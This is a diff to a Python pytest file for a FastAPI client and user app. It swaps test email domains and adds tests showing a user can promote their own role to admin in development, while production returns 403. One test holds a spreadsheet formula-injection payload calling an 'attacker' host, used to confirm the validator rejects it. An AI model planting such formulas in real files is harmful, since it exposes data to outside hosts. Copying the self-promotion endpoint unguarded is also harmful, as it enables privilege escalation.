@@ -2,10 +2,12 @@ import pytest
 from fastapi import HTTPException
 from pydantic import ValidationError
 
-from app.api.auth import upsert_authenticated_user
+from app.api.auth import patch_temporary_own_role, upsert_authenticated_user
 from app.api.clientes import _ensure_cliente_access
 from app.core.auth import require_role
+from app.core.config import Settings
 from app.models.cliente import ClienteCreate
+from app.models.user import UserRoleUpdate
 from app.services.dashboard import build_dashboard
 from app.services.clientes import (
     MAX_CSV_ROWS,
@@ -129,7 +131,7 @@ def test_list_clientes_limits_large_responses():
             ClienteCreate(
                 nombre=f"Cliente {index}",
                 empresa=f"Empresa {index}",
-                email=f"cliente{index}@encipharm.cl",
+                email=f"cliente{index}@enci.cl",
                 rubro="Cerdos",
                 region="Maule",
                 vendedorUid="seller-1",
@@ -147,7 +149,7 @@ def test_dashboard_counts_all_clients_without_api_limit():
             ClienteCreate(
                 nombre=f"Cliente {index}",
                 empresa=f"Empresa {index}",
-                email=f"dashboard{index}@encipharm.cl",
+                email=f"dashboard{index}@enci.cl",
                 rubro="Aves",
                 region="Maule",
                 vendedorUid="seller-1",
@@ -201,7 +203,7 @@ def test_list_users_limits_large_responses():
     for index in range(105):
         db.collection("users").document(f"user-{index}").set({
             "uid": f"user-{index}",
-            "email": f"user{index}@encipharm.cl",
+            "email": f"user{index}@enci.cl",
             "nombre": f"User {index}",
             "rol": "vendedor",
             "activo": True,
@@ -215,7 +217,7 @@ def test_cliente_rejects_formula_injection_payloads():
         ClienteCreate(
             nombre="=IMPORTXML(\"http://attacker\")",
             empresa="Empresa",
-            email="cliente@encipharm.cl",
+            email="cliente@enci.cl",
             rubro="Cerdos",
             region="Maule",
         )
@@ -241,7 +243,7 @@ def test_csv_rejects_too_many_rows():
     rows = [
         "nombre,empresa,email",
         *[
-            f"Cliente {index},Empresa {index},cliente{index}@encipharm.cl"
+            f"Cliente {index},Empresa {index},cliente{index}@enci.cl"
             for index in range(MAX_CSV_ROWS + 1)
         ],
     ]
@@ -256,8 +258,8 @@ def test_csv_import_rejects_duplicate_emails_without_partial_writes():
     db = FakeDb()
     content = "\n".join([
         "nombre,empresa,email",
-        "Cliente Uno,Empresa Uno,duplicado@encipharm.cl",
-        "Cliente Dos,Empresa Dos,duplicado@encipharm.cl",
+        "Cliente Uno,Empresa Uno,duplicado@enci.cl",
+        "Cliente Dos,Empresa Dos,duplicado@enci.cl",
     ]).encode("utf-8")
 
     result = import_clientes_csv(db, content)
@@ -275,7 +277,7 @@ def test_csv_import_rejects_existing_email_without_partial_writes():
         ClienteCreate(
             nombre="Cliente Existente",
             empresa="Empresa Existente",
-            email="existente@encipharm.cl",
+            email="existente@enci.cl",
             rubro="Aves",
             region="Maule",
             vendedorUid="seller-1",
@@ -283,7 +285,7 @@ def test_csv_import_rejects_existing_email_without_partial_writes():
     )
     content = "\n".join([
         "nombre,empresa,email",
-        "Cliente Nuevo,Empresa Nueva,existente@encipharm.cl",
+        "Cliente Nuevo,Empresa Nueva,existente@enci.cl",
     ]).encode("utf-8")
 
     result = import_clientes_csv(db, content)
@@ -299,7 +301,7 @@ async def test_inactive_user_cannot_pass_role_checker(monkeypatch):
     db = FakeDb()
     db.collection("users").document("seller-1").set({
         "uid": "seller-1",
-        "email": "seller@encipharm.cl",
+        "email": "seller@enci.cl",
         "nombre": "Seller",
         "rol": "vendedor",
         "activo": False,
@@ -318,7 +320,7 @@ async def test_inactive_user_cannot_login(monkeypatch):
     db = FakeDb()
     db.collection("users").document("seller-1").set({
         "uid": "seller-1",
-        "email": "seller@encipharm.cl",
+        "email": "seller@enci.cl",
         "nombre": "Seller",
         "rol": "vendedor",
         "activo": False,
@@ -328,8 +330,58 @@ async def test_inactive_user_cannot_login(monkeypatch):
     with pytest.raises(HTTPException) as exc_info:
         await upsert_authenticated_user({
             "uid": "seller-1",
-            "email": "seller@encipharm.cl",
+            "email": "seller@enci.cl",
             "name": "Seller",
         })
+
+    assert exc_info.value.status_code == 403
+
+
+@pytest.mark.anyio
+async def test_temporary_role_updates_current_user(monkeypatch):
+    db = FakeDb()
+    db.collection("users").document("seller-1").set({
+        "uid": "seller-1",
+        "email": "seller@enci.cl",
+        "nombre": "Seller",
+        "rol": "vendedor",
+        "activo": True,
+    })
+    monkeypatch.setattr("app.api.auth.get_db", lambda: db)
+    monkeypatch.setattr(
+        "app.api.auth.get_settings",
+        lambda: Settings(
+            APP_ENV="development",
+            FIREBASE_PROJECT_ID="enci-test",
+            GOOGLE_APPLICATION_CREDENTIALS="serviceAccountKey.json",
+        ),
+    )
+
+    updated = await patch_temporary_own_role(
+        UserRoleUpdate(rol="admin"),
+        {"uid": "seller-1"},
+    )
+
+    assert updated.rol == "admin"
+    assert db.collection("users").rows["seller-1"]["rol"] == "admin"
+
+
+@pytest.mark.anyio
+async def test_temporary_role_is_disabled_in_production(monkeypatch):
+    monkeypatch.setattr(
+        "app.api.auth.get_settings",
+        lambda: Settings(
+            APP_ENV="production",
+            CORS_ORIGINS="https://enci.cl",
+            FIREBASE_PROJECT_ID="enci-test",
+            GOOGLE_APPLICATION_CREDENTIALS="serviceAccountKey.json",
+        ),
+    )
+
+    with pytest.raises(HTTPException) as exc_info:
+        await patch_temporary_own_role(
+            UserRoleUpdate(rol="admin"),
+            {"uid": "seller-1"},
+        )
 
     assert exc_info.value.status_code == 403
